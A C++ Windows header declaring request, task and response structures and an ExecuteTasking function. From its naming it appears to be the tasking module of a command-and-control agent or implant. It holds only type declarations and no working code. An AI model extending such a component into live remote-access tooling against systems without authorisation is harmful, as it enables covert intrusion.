#ifndef _TASKING_INCLUDED
#define _TASKING_INCLUDED

#include <Windows.h>
#include <iostream>
#include <string.h>

#include "Core.h"

typedef struct RequestHandler {

	const char* target_host;
	const char* target_port;
	const char* target_file;

	DWORD timeout;
	DWORD flags; // request flags

	HANDLE hConnection; // connection handler

} RequestHandler, * PRequestHandler;

typedef struct Task {

	std::string taskid;
	std::string task;
	std::string method;
	std::string target;
	std::string data;

} Task, * PTask;

typedef struct Response {

	std::string UUID;
	std::string taskid;
	std::string Payload;

} Response, * PResponse;

std::string ExecuteTasking(State state, std::string &inbound);

#endif